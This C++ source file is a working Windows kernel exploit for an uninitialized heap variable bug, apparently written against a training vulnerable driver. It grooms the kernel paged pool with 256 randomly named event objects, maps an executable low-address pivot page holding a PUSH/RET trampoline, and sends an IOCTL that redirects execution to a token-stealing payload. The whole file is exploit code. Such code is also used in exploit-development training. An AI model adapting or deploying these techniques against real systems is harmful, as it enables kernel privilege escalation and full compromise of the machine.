#include "UninitializedHeapVariable.h"

bool 
ExploitUninitializedHeapVariable::exploit() {

	// This object's size is: 0xF0 (240) bytes
	struct UninitializedHeapVariableObject {
		DWORD unknown;
		void *callback;
		char fill[232];
	};

	UninitializedHeapVariableObject obj;
	memset(&obj, 0, sizeof(obj));
	
	obj.unknown = 0xDEADBABE;
	
	// Step 1: 
	//	We have to wait for the Kernel Pool lookaside lists to initialize,
	// 			what occurs after two minutes since system boot.
	wcout << L"[+] Step 1: Assure that kernel pool lookaside lists are lazy-activated." << endl;
	
	/* Step 2: 
		by Ashfaq Ansari:
			Next stage of exploitation is to make sure that _KPRCB.PPPagedLookasideList[0x1E]
	         ((((0xF0+0xF) >> 3) - 1) = 0x1E) is populated.
	
	         If the payload address contains NULL, then the exploitation will fail. So, make sure
	         there is no NULL in the payload address.
    */
    wcout << L"[+] Step 2: Populating _KPRCB.PPPagedLookasideList[0x1e] ..." << endl;
    
    const PVOID payload = tokenStealingPayloadRealPointer;
    if(!populateLookasideList(payload) ) {
    	return false;
	}
	
	/* Step 3:
		Now that the PagedPool is groomed (allocated contiguosly with every 8th chunk having a hole
		of size 0xF0 - the very next PagedPool allocation shall be yielded from Lookaside List for 
		block size of 0x1E, thus returning our pre-crafted object!
	*/
	wcout << L"[+] Step 3: Sending IOCTL and praying, the next allocation takes off from lookaside!" << endl;

	bool ret = driver.SendIOCTL (
		ExploitUninitializedHeapVariable::Ioctl_Code,
		&obj,
		sizeof(obj)
	);
	
	return ret;
}

void 
ExploitUninitializedHeapVariable::waitForLookasideLists() {
	
	static const ULONG Two_Minutes_Ticks = 2 * 60 * 10000 + 100;
	const ULONG ticks1 = GetTickCount();
	
	if (ticks1 > Two_Minutes_Ticks) {
		return;
	}
	else {
		const ULONG diff = Two_Minutes_Ticks - ticks1;
		wcout << L"[.] Have to wait " << diff / 1000 << L" seconds for Kernel pools Lookaside lists to activate." 
			<< endl;
			
		Sleep(diff);
	}
}

bool 
ExploitUninitializedHeapVariable::populateLookasideList(PVOID payload) {
	
	ULONG_PTR pivotAddress = mapUnicodePivotPage(payload);
	if(!pivotAddress) {
		return false;
	}
	
	/*
		by Ashfaq Ansari:
			We know that each bucket in LookAsideList can not hold more than 256 free chunks.
			
			As we are dealing with Named Objects, one of the caveat is, if same static string
			is passed to consecutive calls to Object constructor as Object Name, then only one
			Pool chunk will be served for all the requests. This will not allow us to populate
			LookAsideList and the exploitation will fail.
			
			To overcome this issue, we need to make sure that the string is random for each call
			to Object constructor.
			
			So, to populate the LookAsideList, allocate 256 objects of same size and then free them.
    */
    
    shared_ptr<HANDLE> eventObjects( 
		new HANDLE[Max_Chunks_In_Lookaside_List_Bucket],
		
		[](HANDLE *ptr) {
			for(size_t i = 0; i < Max_Chunks_In_Lookaside_List_Bucket; i++) {
				HANDLE obj = (reinterpret_cast<HANDLE*>(*ptr))[i];
				if(obj != 0) {
					CloseHandle(obj);
				}
			}
			
			delete [] ptr;		
		}
	);
    
    if(!eventObjects) {
    	throw bad_alloc();
	}
	
	HANDLE *eventObjectsPtr = eventObjects.get();
    
    wcout << L"[+] Allocating " << Max_Chunks_In_Lookaside_List_Bucket 
		<< L" PagedPool chunks via CreateEvent/UNICODE_STRING..." << endl;
		
    for(size_t i = 0; i < Max_Chunks_In_Lookaside_List_Bucket; i++) {
    	// Random event name generation
    	unsigned char name[Max_Object_Name_Length] = {0};
    	
    	for(size_t j = 0; j < Max_Object_Name_Length - 1; j++) {
    		name[j]	= random('A', 'Z');
		}
		
		// fix the shellcode trampoline:
		name[2] = (pivotAddress & 0xff);
		name[3] = (pivotAddress >> 16) & 0xff;
		
		/* 
			Since the ASCII name will get converted to the UNICODE_STRING - it will become
			NULL-prepended every byte.
			
			The allocated chunk for the event's name will contain the following data:
			Chunk+0x00: 00 XX 00 YY 00 AA 00 BB 00 CC 00 DD 00 EE 00 FF ...
			
			Where :
				XX YY - are the first two bytes of the event's name
				AA BB CC DD EE FF - are the consecutive bytes from the event's name
				
			Event's name:
				\xXX\xYY\xAA\xBB\xCC\xDD\xEE\xFF - where AA,BB,CC are not values, but rather "unknowns".
				
			The first four bytes will not be interesting for us, those are: 
				00 XX 00 YY, 
			(by the way, they will got clobbered by SLINK_ENTRY.Flink after putting the chunk into 
			lookaside list for 0x1e bucket) but rather the following four bytes:
				00 AA 00 BB
			will be essential, since they will constitute register-indirect call:
				call [eax + 4]		; call into 0x00AA00BB
				
			There will be placed our PIVOT page with the trampoline leading into kernel shellcode.
		*/
		
		eventObjectsPtr[i] = CreateEventA(
			nullptr, 
			false,
			false,
			reinterpret_cast<LPCSTR>(name)
		);
		
		if(!eventObjectsPtr[i]) {
			wcout << L"[!] Could not create event! Error: " << GetLastError() << endl;
			return false;
		}
	}
    
    wcout << L"[+] Kernel PagedPool grooming by freeing every 8th chunk (to avoid coalesce)" << endl;
    for( size_t i = 0; i < Max_Chunks_In_Lookaside_List_Bucket; i += 8 ) {
    	CloseHandle(eventObjectsPtr[i]);
    	eventObjectsPtr[i] = static_cast<HANDLE>(0);
	}
	
	return true;
}

ULONG_PTR
ExploitUninitializedHeapVariable::mapUnicodePivotPage(PVOID payload) {
	NTSTATUS stat;
	ULONG_PTR pivotAddress;
	bool mapped = false;
	SIZE_T regionSize = 0x01;	// will be rounded up to one page anyway.
	
	typeNtAllocateVirtualMemory NtAllocateVirtualMemory;
	NtAllocateVirtualMemory  = reinterpret_cast<typeNtAllocateVirtualMemory>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), 
		"NtAllocateVirtualMemory"
	));
	
	static const size_t Max_Attempts = 32;
	size_t attempt = 0;
	
	while(!mapped && attempt++ < Max_Attempts) {
		pivotAddress = random('a', 'z') << 16 | random('a', 'z');
		
		stat = NtAllocateVirtualMemory (
			reinterpret_cast<HANDLE>(0xffffffff),
			reinterpret_cast<PVOID*>(&pivotAddress),
			0,
			const_cast<PULONG>(&regionSize),
			MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
			PAGE_EXECUTE_READWRITE
		);
	
		if(NT_SUCCESS(stat)) {
			mapped = true;	
			break;
		}
	}
	
	if (!mapped) {
		wcout << L"[!] Could not allocate Unicode-compatible low-address page!" << endl;
		return 0;
	}
	
	wcout << L"[+] Mapped Pivot page at Unicode-compatible address: " << hex << setw(8) 
		<< setfill(L'0') << pivotAddress << endl;
		
	// Setting trampoline:
	//	68 AA BB CC DD		PUSH kernel_shellcode_address
	//	C3					RET
	unsigned char trampoline[] = {
		0x68,
		0xaa, 0xbb, 0xcc, 0xdd,
		0xc3
	};
	
	*(reinterpret_cast<DWORD*>(&trampoline[1])) = reinterpret_cast<DWORD>(payload);
	
	wcout << L"[+] Setting trampoline at pivot page leading to: " << hex << setfill(L'0') << setw(8)
		<< payload << endl;
		
	// copy the trampoline into pivot page
	memcpy (
		reinterpret_cast<void*>(pivotAddress), 
		trampoline, 
		sizeof(trampoline)
	);
	
	return pivotAddress;
}
